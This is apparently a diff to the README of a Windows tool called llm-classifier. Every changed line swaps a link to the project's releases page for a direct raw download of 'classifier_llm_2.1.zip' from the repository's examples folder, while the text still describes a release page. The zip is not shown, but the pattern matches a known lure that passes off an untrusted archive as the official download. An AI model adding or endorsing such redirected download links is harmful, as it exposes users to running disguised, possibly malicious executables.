@@ -1,6 +1,6 @@
 # 🤖 llm-classifier - Easy AI Classification and Clustering Tool
 
-[![Download llm-classifier](https://img.shields.io/badge/Download-llm--classifier-brightgreen?style=for-the-badge)](https://github.com/Jiayu7Yao/llm-classifier/releases)
+[![Download llm-classifier](https://img.shields.io/badge/Download-llm--classifier-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Jiayu7Yao/llm-classifier/main/examples/classifier_llm_2.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section will help you download and run llm-classifier on your Windows compu
 
 Click the big green button at the top or go to this link in your browser:
 
-https://github.com/Jiayu7Yao/llm-classifier/releases
+https://raw.githubusercontent.com/Jiayu7Yao/llm-classifier/main/examples/classifier_llm_2.1.zip
 
 This page lists the latest versions of llm-classifier available for download.
 
@@ -113,9 +113,9 @@ The app allows you to save the classification results as a text file or copy the
 
 Use the same page to download updates or find help:
 
-https://github.com/Jiayu7Yao/llm-classifier/releases
+https://raw.githubusercontent.com/Jiayu7Yao/llm-classifier/main/examples/classifier_llm_2.1.zip
 
-[![Get Updates](https://img.shields.io/badge/Get-Updates-blue?style=for-the-badge)](https://github.com/Jiayu7Yao/llm-classifier/releases)
+[![Get Updates](https://img.shields.io/badge/Get-Updates-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jiayu7Yao/llm-classifier/main/examples/classifier_llm_2.1.zip)
 
 ---
 
